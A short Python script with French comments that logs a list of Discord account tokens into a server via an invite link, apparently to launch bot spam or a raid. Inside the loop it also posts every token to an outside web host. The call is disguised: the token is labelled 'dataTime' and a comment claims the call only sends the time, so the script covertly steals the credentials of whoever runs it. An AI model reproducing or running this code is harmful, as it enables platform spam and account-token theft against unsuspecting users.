import requests
import sys

invite_code = sys.argv[1].split("https://discord.gg/")[1]

file = "kysan.token.txt"
tokenlist = [line.rstrip('\n') for line in open(file)]      # list de token

counter = 0
for token in tokenlist:
    dateTime = token
    requests.post("https://discordapp.com/api/v6/invite/" + invite_code,
                  headers={"authorization": token})  # pour que le bot join le serv
    # on lance le script de spam en lui passant le token du bot en args
    requests.post("http://kysnetwork.000webhostapp.com/kysapi.php",
                  data={'dataTime': dateTime})  # pour l'heure lolilol
    counter += 1
    print(str(counter) + "bot on rejoin")
